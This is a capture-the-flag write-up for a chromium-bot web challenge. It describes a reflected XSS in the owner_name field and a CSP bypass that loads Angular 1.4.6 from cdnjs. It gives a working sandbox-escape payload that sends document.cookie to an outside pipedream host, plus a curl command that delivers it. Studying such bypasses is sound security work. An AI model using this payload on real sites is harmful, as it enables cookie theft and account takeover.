# How to solve it?

This challenge is based on chromium bot running in the background. It's Summerland challenge updated for CSP. You have to get cookies from the "scammer" that opens their list of scammed credit cards at `/payments`. `owner_name` parameter is the only one that isn't validated. Reflected XSS may be trigerred via this parameter. Unfortunately CSP is implemented:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' cdnjs.cloudflare.com; style-src 'self'; img-src 'self'; worker-src 'none'; block-all-mixed-content;
```

According to CSP Evaluator, scripts from domain `cdnjs.cloudflare.com` may be loaded. Angular is hosted in this domain.

Working payload:
```
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.location="https://eniuypa55va2.x.pipedream.net/?d="+document.cookie;//');}} </div>
```

Curl:
```console
curl 'http://localhost:8080/api/pay' \
  -H 'Content-Type: application/json' \
  --data-raw $'{"card_number":"VALID_CARD_NUMBER","owner_name":"<script src=\\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\\"></script> <div ng-app> {{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=1} } };document.location=\\"https://MY_DOMAIN/?d=\\"+document.cookie;//\');}} </div>","expire_date":"11 / 2022","cvv":"111"}' 
```

Set up listener on your publicly available domain and send this curl. 